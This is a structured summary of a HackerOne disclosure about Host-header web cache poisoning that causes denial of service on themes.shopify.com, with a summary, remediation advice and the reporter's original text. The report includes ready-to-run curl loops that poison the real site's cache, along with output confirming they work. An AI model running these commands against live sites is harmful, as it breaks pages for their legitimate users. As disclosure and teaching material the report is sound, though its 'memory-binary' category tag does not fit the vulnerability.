# Host Header Web Cache Poisoning Leading to Denial of Service on themes.shopify.com

## Metadata
- **Source:** HackerOne
- **Report:** 1096609 | https://hackerone.com/reports/1096609
- **Submitted:** 2021-02-05
- **Reporter:** g4mm4
- **Program:** Shopify (HackerOne)
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** Web Cache Poisoning, HTTP Host Header Injection, Denial of Service
- **CVEs:** None
- **Category:** memory-binary

## Summary
The themes.shopify.com domain is vulnerable to web cache poisoning through HTTP Host header manipulation, allowing attackers to inject arbitrary port numbers into cached responses. This causes subsequent legitimate users to receive poisoned content with broken resource links to non-existent ports, resulting in degraded functionality and denial of service.

## Attack scenario
1. Attacker sends requests to https://themes.shopify.com with a modified Host header specifying an arbitrary closed port (e.g., Host: themes.shopify.com:1337)
2. The origin server processes the request and includes the malicious Host header value in the response (e.g., in canonical links, resource URLs)
3. The CDN/cache layer stores this poisoned response and serves it to subsequent legitimate users
4. Legitimate users visiting https://themes.shopify.com receive the poisoned cached response with port :1337 in URLs
5. Browsers attempt to load resources from themes.shopify.com:1337, which is not accessible, causing resource load failures
6. Users experience broken page rendering, missing images, stylesheets, and JavaScript—resulting in functional denial of service

## Root cause
The application fails to validate/normalize the Host header before including it in cached responses. The CDN caches responses keyed without properly accounting for Host header variations, and the application reflects the unsanitized Host header in canonical links and resource URLs.

## Attacker mindset
An attacker with knowledge of web cache vulnerabilities and HTTP header manipulation can perform a low-effort, high-impact attack by poisoning shared caches affecting all subsequent users. The attack requires minimal resources—just crafted HTTP requests—and can degrade service availability for legitimate users without authentication.

## Defensive takeaways
- Implement strict Host header validation and normalization; only allow expected domain/port combinations
- Never reflect the Host header directly in responses without validation
- Use cache keys that include normalized Host header values or exclude them entirely
- Configure CDN/cache to ignore or normalize the Host header based on security policies
- Implement cache purging mechanisms and monitoring to detect and respond to poisoning attempts
- Use Vary: Host header to segregate cache entries by legitimate Host values
- Perform security testing for cache poisoning vectors using tools like Burp Suite cache testing extensions

## Variant hunting
Test other Shopify subdomains and properties for similar Host header caching issues; investigate whether other HTTP headers (X-Forwarded-Host, X-Original-Host, Referer) are similarly vulnerable; check if other ports or protocol manipulations (http vs https) can be injected; test for cache poisoning via headers like X-Forwarded-Proto; examine if the vulnerability affects API endpoints or other content types.

## MITRE ATT&CK
- T1190
- T1499
- T1561

## Notes
This is a classic web cache entanglement vulnerability. The impact is Denial of Service through cache poisoning rather than security data exfiltration. The fix typically requires coordination between application developers and CDN operators. The reporter provided clear reproduction steps with observable evidence of successful cache poisoning.

## Full report
<details><summary>Expand</summary>

Hi there,
I just found the website:
https://themes.shopify.com
is infected with "Web cache poisoning" via HOST header lead to Denial of Services
Abuse this bug, Attacker can:

Poison your cache with HTTP header Host header with arbitrary PORT which is not opened. This attack may lead to Denial of Services

How to reproduce the issue:
In the 1st terminal, run command likes this:
----------
$ while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done
----------


In the 2nd terminal, run command below for confirmation this attack is successful or not:
----------
$ while true; do curl -ik "https://themes.shopify.com:443/"|grep ":1337"; done
----------
and the output from command with be confirmed my Host header poisoning worked:
$ while true; do curl -ik "https://themes.shopify.com:443/"|grep ":1337"; done
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  <link rel="canonical" href="https://themes.shopify.com:1337/">
        <li><div class="popover-wrapper js-popover-dropdown popover-wrapper--dropdown" data-position="bottom" data-align="left"><button type="button" class="popover__trigger marketing-nav__item marketing-nav__item--primary" itemprop="name">Collections<svg class="icon marketing-nav__arrow" aria-hidden="true" focusable="false"> <use xlink:href="#modules-caret-down" /> </svg></button><div class="popover"><div class="popover__content"><ul class="popover__list"><li><a href="/collections/trending-themes" class="marketing-nav__item marketing-nav__item--child" itemprop="name" data-ga-event="Main Nav" data-ga-action="Clicked" data-ga-label="trending-themes">Trending this week </a></li><li><a href="/collections/product-recommendations" class="marketing-nav__item marketing-nav__item--child" itemprop="name" data-ga-e
...........
+++

Finally, when user visits the homepage: https://themes.shopify.com, so many images, css, link will not be loaded (Because the port :1337 which appended themes.shopify.com:1337 is not opened
Please see the attached image for details.

cheers,
~g4mm4
References:
https://portswigger.net/research/web-cache-entanglement
Denial of Services

## Impact

Denial of Services

</details>

---
*Analysed by Claude on 2026-05-24*
